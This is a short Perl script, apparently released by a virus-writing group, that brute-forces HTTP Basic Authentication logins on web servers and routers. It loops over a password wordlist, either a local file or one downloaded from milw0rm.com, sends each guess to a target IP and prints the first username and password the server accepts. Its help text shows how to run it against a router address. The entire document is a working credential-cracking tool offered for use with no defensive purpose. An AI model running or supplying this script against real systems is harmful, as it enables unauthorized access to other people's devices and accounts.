#!/usr/bin/perl
=poc
Simple .htaccess bruteforcer. Could be usefull to crack router logins.

by Perforin
virii.lu
#vxnet

Greetings to everyone from #vxnet and EOF
=cut

use HTTP::Request;
use LWP::UserAgent;
use LWP::Simple;
use File::Temp qw(tempfile);

use strict;
use warnings;
use diagnostics;

my($ip,$user,$dic) = @ARGV;
my($fh, $tmpfile) = tempfile("X" x 23, UNLINK => 1);
my($useragent,$request,$zeile,$_,@data);


if (@ARGV < 3) { help(); }

print <<"INTRO";
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.htaccess Bruter              by Perforin
                                 virii.lu
                                   #vxnet                             
~[v1.0]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

INTRO

if ($dic =~ m/--milw0rm/i) {
print "[~] Loading milw0rm wordlist...\n";
getstore('http://milw0rm.com/mil-dic.php',$tmpfile) || die "milw0rm down?!\n";
open(DIC,"<",$tmpfile) || die "Wordlist not found or permission denied!\n";
} else {
open(DIC,"<",$dic) || die "Wordlist not found or permission denied!\n";
}

$useragent = LWP::UserAgent->new;
$request = HTTP::Request->new(GET => 'http://' . $ip);

while(<DIC>) {
chomp($_);

$request->authorization_basic($user, $_);  
@data = $useragent->request($request)->as_string;

foreach $zeile (@data) {
if($zeile =~ m/401 Unauthorized/i) {
print "[~] Bruting...\n";
} else {
print "\n[!] Got login!\n";
print "[!] " .  $user . ":" . $_ . "\n";
exit;
    }
  }
}
print "[-] Could not be cracked!\n";
close(DIC);

sub help {
print <<"HELP";
########################################
      .htaccess bruter by Perforin      

brute.pl 192.168.1.1 admin dic.txt
brute.pl 192.168.1.1 admin --milw0rm

###############[virii.lu]###############
HELP
exit;
}
